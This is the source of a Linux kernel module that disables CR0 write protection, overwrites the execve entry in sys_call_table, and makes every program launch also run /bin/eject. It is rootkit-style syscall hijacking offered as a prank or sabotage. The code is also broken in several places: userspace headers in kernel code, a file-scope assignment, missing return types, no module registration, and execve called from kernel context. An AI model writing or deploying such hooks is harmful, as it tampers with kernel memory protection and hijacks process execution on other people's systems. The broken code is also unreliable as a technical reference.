#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/version.h>
#include<linux/proc_ns.h>
#include<sys/types.h>
#include<unistd.h>
// execve("/usr/bin/bash", ["bash"], 0x7fff23adffb0 /* 42 vars */) = 0

unsigned long cr0, orig_cr0;
void (* force)(unsigned long) = NULL;
long ret;
char *cmd[2] = { "eject", (char *)0 };
char *env[1] = { NULL };

#define unprotect_memory() \
({ \
        orig_cr0 = read_cr0(); \
        write_cr0(orig_cr0 & (~ 0x00010000)); \
});

#define protect_memory() \
({ \
        write_cr0(orig_cr0); \
});


static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    asm volatile(
            "mov %0, %%cr0"
            : "+r"(val), "+m"(__force_order)
        );
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16 ,0)
    force = &write_cr0_forced;
#endif

asmlinkage long (*orig_execve)(const char *pathname, char *const argv[], char *const envp[]);
unsigned long *sys_call_table;

hooking_syscall(void *hook_addr, __uint16_t syscall_offset, unsigned long *sys_call_table)
{
    unprotect_memory();
    sys_call_table[syscall_offset] = (unsigned long) hook_addr;
    protect_memory();
}

unhooking_syscall(void *orig_addr, u_int16_t syscall_offset, unsigned long *sys_call_table)
{
    unprotect_memory();
    sys_call_table[syscall_offset] = (unsigned long) orig_addr;
    protect_memory();
}

asmlinkage long hooked_eject(const char *pathname, char *const argv[], char *const envp[])
{
    printk("Hooked!");
    execve("/bin/eject", argv, envp);
    return orig_execve(pathname, argv, envp);
}

static int __init eject_init(void) {
    sys_call_table = kallsyms_lookup_name("sys_call_table");
    orig_execve = (void*)sys_call_table[__NR_execve];
    hooking_syscall(hooked_eject, __NR_execve, sys_call_table);
}

static void __exit eject_cleanup(void)
{
    unhooking_syscall(orig_execve, __NR_execve, sys_call_table);
}
